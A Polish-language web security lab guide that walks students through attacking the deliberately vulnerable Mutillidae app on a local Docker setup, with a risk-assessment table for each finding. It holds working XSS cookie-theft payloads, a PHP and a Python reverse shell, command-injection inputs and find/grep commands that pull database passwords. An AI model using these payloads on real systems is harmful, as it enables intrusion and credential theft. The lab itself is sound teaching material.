# Zagadnienia prezentowane przed nami
1. SQLI
1. CSRF
1. Server Side Template Injection
1. SSRF

# ASVS 4
Link do GitHub'a:
[github.com/OWASP/ASVS](https://github.com/OWASP/ASVS/blob/v4.0.3/4.0/docs_en/OWASP%20Application%20Security%20Verification%20Standard%204.0.3-en.csv)

# Laboratoria
### Spis treści
1. Zadanie 0: Adding user, login, password policies. ASVS.
1. Zadanie 1: Session Hijacking
1. Zadanie 2: Cross Site Scripting (XSS)
1. Zadanie 3: Reverse Shell
1. Zadanie 4: Dodatkowe

### Instalacja maszyny i przygotowanie środowiska
#### Opcja 1 (Zalecana)
Wersja: 2.8.59
```bash
git clone https://github.com/webpwnized/mutillidae-docker
cd mutillidae-docker
docker-compose up
```

Jeśli wystąpią problemy:
1. Doinstaluj docker-compose  `sudo apt install docker-compose`.
1. Dodaj siebie do grupy `docker`. `sudo usermod -aG docker $USER`.
1. Opcjonalnie zrestartuj serwis `sudo service docker restart`.
1. Uruchom dockera z pozycji roota `sudo docker-compose up`.
1. Jeśli pojawia się błąd, że adres jest już _"zbindowany"_ `sudo service apache2 stop`

#### Opcja 2 (Tylko jeśli nie działa pierwsza)
Wersja: 2.6.52 
1. `docker pull bltsec/mutillidae-docker`
1. `docker run -d -p 80:80 -p 443:443 --name owasp17 bltsec/mutillidae-docker`
1. Przejdź do `localhost/mutillidae`

Kod źródłowy każdej strony możesz podejrzeć na `http://127.0.0.1/index.php?page=source-viewer.php`

#### BURP SUITE
Podczas pracy przyda się narzędzie BURP SUITE. Zainstaluj je jeśli jest taka potrzeba.

### Zadanie 0 Przykład pracy z ASVS
1. Sprawdź czy możesz stworzyć użytkownika, którego hasło posiada mniej niż 12 znaków.  
Zapisz numer ASVS, oceń poziom ryzyka (Możesz zrobić to sam lub skorzystać z przykładowego rozwiązania zaprezentowanego w prezentacji). Na koniec zasugeruj rozwiązanie problemu.  
1. Spróbuj zmienić hasło użytkownika. Sprawdź czy wymagana jest znajomość starego hasła. Zapisz numer ASVS, oceń poziom ryzyka oraz zasugeruj rozwiązanie problemu.
1. Wykorzystaj tabelę niżej i spróbuj zidentyfikować pozostałe (o ile istnieją) wady.
1. Wycinek tabeli do pomocy

| # | Description | CWE | NIST |
| --- | --- | --- | --- |
| V2.1.1 | Verify that user set passwords are at least 12 characters in length (after multiple spaces are combined). ([C6](https://owasp.org/www-project-proactive-controls/#div-numbering)) | 521 | 5.1.1.2 |
| V2.1.2 | Verify that passwords of at least 64 characters are permitted, and that passwords of more than 128 characters are denied. ([C6](https://owasp.org/www-project-proactive-controls/#div-numbering)) | 521 | 5.1.1.2 |
| V2.1.3 | Verify that password truncation is not performed. However, consecutive multiple spaces may be replaced by a single space. ([C6](https://owasp.org/www-project-proactive-controls/#div-numbering)) | 521 | 5.1.1.2 |
| V2.1.4 | Verify that any printable Unicode character, including language neutral characters such as spaces and Emojis are permitted in passwords. | 521 | 5.1.1.2 |
| V2.1.5 | Verify users can change their password. | 620 | 5.1.1.2 |
| V2.1.6 | Verify that password change functionality requires the user's current and new password.  | 620| 5.1.1.2 |

Przypomnienie: Prowadź tabelę w której będziesz wszystko zapisywał.

### Zadanie 1 - Session Hijacking 
1. Wykorzystując wiedzę o pliku robots.txt odszukaj lokalizację na stronie gdzie mogą być przechowane hasła użytkowników.  
    <details>
    <summary>Podpowiedź 1 (rozwiń)</summary>
    1. W adresie url <code>http://localhost/index.php?page=robots-txt.php</code> podmień zawartość <code>page</code> na <code>robots.txt</code>. (<code>http://localhost/index.php?page=robots.txt</code>)
    </details>
    <details>
    <summary>Podpowiedź 2 (rozwiń)</summary>
    1. Przekieruj się na adres <code>http://localhost/passwords/</code>
    </details>
1. Zapisz dane logowania dowolnego użytkownika.
1. Oczywiście sposobów wydobycia ciasteczka sesji jest wiele (prezentacja). Stworzymy prosty scenariusz w celu którego wykorzystamy narzędzie BURP SUITE. Zaloguj się na wybranego użytkownika. Włącz przechwytywnie zapytania. Odśwież stronę.
1. Zapisz ciasteczko sesji w osobnym pliku.
![Cookie section](assets/z1.png)
1. Wyłącz przechwytywanie. Wyloguj się z aktualnego użytkownika i zaloguj się na innego lub stwórz własne konto.
1. Włącz przechwytywanie. Odśwież stronę i przejdź do BURP SUITE.
1. Podmień wartość `Cookie` na skopiowaną wartość wcześniejszego użytkownika. Naciśnij `Forward`.
1. Właśnie zostałeś uwierzytelniony jako drugi użytkownik. Jednak po przejściu na dowolną inną stronę otrzymujemy zresetowane ciasteczko użytkownika, na którego się logowaliśmy. Jeśli chcemy używać danej sesji podczas wykonywania ataków należy użyć opcji `Process cookies in redirections`.
1. Stwórz tabelę oceny zagrożenia.

### Zadanie 2 - Cross Site Scripting (XSS)
W tej częsci postaramy się wykraść od użytkowników przeglądających blog ich ciasteczka sesji, żeby móc wykorzystać je tak jak w labie wcześniejszym.  

#### Persistent
1. Zaloguj się na dowolnego użytkownika i przejdź na stronę `http://localhost/index.php?page=view-someones-blog.php`.  
Lub OWASP 2017 -> A7 - Cross Site Scripting (XSS) -> Persistent (Second order) -> Add to your blog.  
1. Dla sprawdzenia czy podatność istnieje wykorzystamy najprostszy payload. Wpisz w polu wpisywania: `<script>alert(document.cookie)</script>`.  
Wyślij treść bloga na serwer. Od razu pojawia się alert w którym są informacje z aktualnej sesji. Podatność istnieje - wykorzystajmy ją.
1. Do zaprezentowania ideii wstrzykniemy kod, który zaproponuje odwiedzającemu zapisanie pewnego pliku. Jego zawartością będzie ciasteczko z sesją.
1. Na zalogowanym użytkowniku proszę wprowadzić zapis o treści:  
    ```js
    var a = document.createElement("a");
    a.href = window.URL.createObjectURL(new Blob([WHAT_TO_EXTRACT?], {type: "text/plain"}));
    a.download="DONT_DELETE_THIS_IMPORTANT.txt";
    a.click();
    ```
1. Zauważ, że treścią która zostanie wpisana do pliku *.txt będzie wartość `WHAT_TO_EXTRACT` czy aby na pewno jest to poprawna wartość? ;)  
    <details>
    <summary>Podpowiedź (rozwiń)</summary>
    1. Podmień zawartość <code>WHAT_TO_EXTRACT</code> na <code>document.cookie</code>. 
    </details>
Pamiętaj, żeby owinąć całość odpowiednim tagiem!
1. Po zapisaniu bloga. Wyloguj się z aktualnego użytkownika i zaloguj na innego. Wejdź na stronę `http://localhost/index.php?page=view-someones-blog.php`.  
Lub OWASP 2017 -> A7 - Cross Site Scripting (XSS) -> Persistent (Second order) -> View someone's blog.  
1. Wyszukaj blogi wcześniejszego użytkownika.
1. And voilà!
![Downloading file with cookie sesion](assets/z2.png)
Oczywiście prawdopodobieństwo, że ktoś zostawi taki plik na publicznym komputerze w firmie po pobraniu jest małe - jednak ciągle niezerowe...
1. Zapisz zgodnie z wytycznymi wpis w tabeli oceny ryzyka. Weź pod uwagę, że każda strona wyciągająca zainfekowany rekord z bazy danych wywoła znajdujący się tam skrypt.

#### DOM-based XSS
1. Wejdź na stronę `http://127.0.0.1/index.php?page=html5-storage.php`.  
Lub OWASP 2017 -> A7 - Cross Site Scripting (XSS) -> DOM-Based -> HTML5-web-storage. 
1. Zapoznaj się z poniższym fragmentem kodu, który jest wywoływany gdy wpisywany jest klucz i wartość na stronie.
```js
var setMessage = function(/* String */ pMessage){
		var lMessageSpan = document.getElementById("idAddItemMessageSpan");
		lMessageSpan.innerHTML = pMessage;
		lMessageSpan.setAttribute("class","success-message");
	};// end function setMessage
```  

Podpowiedź: Zobacz jak działa metoda `innerHTML`.

1. Spróbuj wpisać payload z alertem w javascript `<script>alert(1)</script>`. Czy wpisany kod działa?
1. Wykorzystamy inny element DOM np. znacznik `<img>`. Proszę wpisać w polu wartość `<img src=nothing onerror="alert(document.cookie)"/>"`.
1. Od razu po wysłaniu wykonuje się kod z JS, który był ukryty wewnątrz tagu `<img>`.
1. Uzupełnij tabelę o nową podatność. Opisz ją.

#### Reflected
Działa tak samo jak Persistent tylko jednorazowo na daną stronę. (prezentacja)
Jak myślisz dlaczego przeglądarka dopuszcza do wykonywania takiego kodu? Zwiększ poziom bezpieczeństwa na poziom `5`. Spróbuj wpisać prosty skrypt.

### Zadanie 3 - Reverse shell
Sprawdzanie tego co widać to nie wszystko. Jednym z ciekawszych elementów, które można sprawdzać to połączenia na niefiltrowanych portach, brak walidacji w przesyłaniu plików i tym podobne.

#### Sposób 1 
1. Udaj się na stronę `http://localhost/index.php?page=upload-file.php`
1. Przygotuj skrypt w PHP (plik znajduje się w tym repozytorium pod nazwą `rev.php`) i zapisz w lokalnym folderze. Podmień adres IP na swój i zapamiętaj/zmień port.
1. W pierwszym terminalu ustaw nasłuchiwanie na wybranym porcie np. `nc -lvnp 1337`. Adres IP ustaw na swój. (Żeby sprawdzić swoje ip wpisz w terminalu `ipconfig -a`)
1. Zapisz skrypt i wrzuć go na stronę do upload'u.
1. Pojawi się informacja w jakiej lokalizacji został umieszczony.
![Upload reverse shell](assets/z5.png)
1. Nawiguj do `http://localhost/index.php?page=/tmp/<nazwa_twojego_pliku>.php`
1. W momencie wejścia na stronę wywołuje się skrypt a w terminalu powinniśmy mieć aktywne połączenie.
![Reverse Shell 1](assets/z6.png)
1. Posiadając dostęp do wewnętrznej struktury katalogów spróbuj znaleźć hasło do bazy danych.
    <details>
    <summary>Podpowiedź 1 (rozwiń)</summary>
    1. Wyszukaj wszytkie pliki o rozszerzeniu "\*.php" <code>find / -name "*.php"</code>. 
    </details>

    <details>
    <summary>Podpowiedź 2 (rozwiń)</summary>
    1. Wykorzystaj narzędzie do wyszukiwania wzorca tekstu <code>grep -i "password"</code> lub <code>grep "="</code>. 
    </details>

    <details>
    <summary>Podpowiedź 3 (rozwiń)</summary>
    1. Ostateczne polecenie może wyglądać w ten sposób <code>find / -name "*.php" | xargs grep -i "password" | grep "="</code>. 
    </details>

1. W całym ciągu tekstu interesuje nas ten urywek

    ```
    /var/www/mutillidae/classes/YouTubeVideoHandler.php:	public $HowtoResetRootPasswordinMySQLMariaDB = 143;
    /var/www/mutillidae/classes/MySQLHandler.php:	static public $mMySQLDatabasePassword = DB_PASSWORD;
    /var/www/mutillidae/classes/MySQLHandler.php:	static public $MUTILLIDAE_DBV1_PASSWORD = "";
    /var/www/mutillidae/classes/MySQLHandler.php:	static public $MUTILLIDAE_DBV2_PASSWORD = "mutillidae";
    /var/www/mutillidae/classes/MySQLHandler.php:	static public $SAMURAI_WTF_PASSWORD = "samurai";
    /var/www/mutillidae/classes/MySQLHandler.php:	        $this->mMySQLConnection = new mysqli($pHOSTNAME,$pUSERNAME, $pPASSWORD, NULL, $pPORT);
    ```

    <details>
    <summary>Hasło do bazy to [...]</summary>
    1. <code>samurai</code>. 
    </details>

1. Weź pod uwagę, że strona jest cały czas w stanie "zawieszenia".
<!-- 
#### Sposób 2
1. Upewnij się, że aplikacja ciągle działa w tle.
1. Na jednym terminalu ustaw nasłuchiwanie na dowolnym niefiltrowanym porcie (np. 1337)
1. Na drugim terminalu wpisz poniższą komendę:
    ```
    export RHOST="X.X.X.X";export RPORT=XXXX;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
    ```
1. Pamiętaj, żeby zmienić adres hosta razem z portem!
1. W nasłuchiwanym terminalu powinien pojawić się shell.
![Reverse shell](assets/z3.png)  

1. Tak samo jak w sposobie 1 spróbuj odszukać hasło do bazy danych.
1. Porównaj jakie masz uprawnienia w obu przypadkach? Co może być powodem?
1. Opisz podatności w tabeli. -->

### Zadanie 4 - Dodatkowe
Ta część laboratorium jest przeznaczona na własny rekonesans. Wcześniejsze przykłady były podane w wąskim zakresie dlatego teraz pora na rozwinięcie skrzydeł. Przetestuj aplikację we własnym zakresie - z tym co wiesz lub chcesz poznać. Propozycja: skorzystaj z podanych list i testuj wszystko po kolei. 

Jeśli testując elementy aplikacji uznasz atak siłowy za potrzebny to skorzystaj z payload'ów z tego repozytorium: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

1. Niektóre podatności (np. XSS) występują na innych stronach. Postaraj się je odszukać.
1. Znajdź inne podatności np. na stronie logowania (`SQL injection`)
1. Na stronie `http://127.0.0.1/index.php?page=dns-lookup.php` możesz podejrzeć strukturę katalogów wykorzystując polecenie `ls`. Sprawdź czym musisz je poprzedzić, żeby zadziałało.
<details>
<summary>Podpowiedź(rozwiń)</summary>
1. Wpisz <code>& ls /</code>. Możesz dokładnie podejrzeć strukturę plików. Możesz też wpisać <code>& whoami</code> lub <code>& id</code>w celu sprawdzenia jakim użytkownikiem (oraz z jakimi uprawnieniami) jesteś.  
</details>

![Injection](assets/z4.png) 

1. Na tej samej stronie spróbuj znaleźć hasło do bazy danych. Pierwsza opcja to rekonesans (Nie trzeba głęboko szukać).
<details>
<summary>Podpowiedź do drugiego sposobu (rozwiń)</summary>
<code>&find /var/www/mutillidae -name "*.php" | xargs egrep -i "password" | grep "="</code>
</details>

1. I wszystko co inne postaraj się oceniać w tabeli oceny zagrożeń.

## Źrodła 
1. https://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson10/index.html
1. https://github.com/Wh1ter0sEo4/reverse_shell_php/blob/main/reverse_shell.php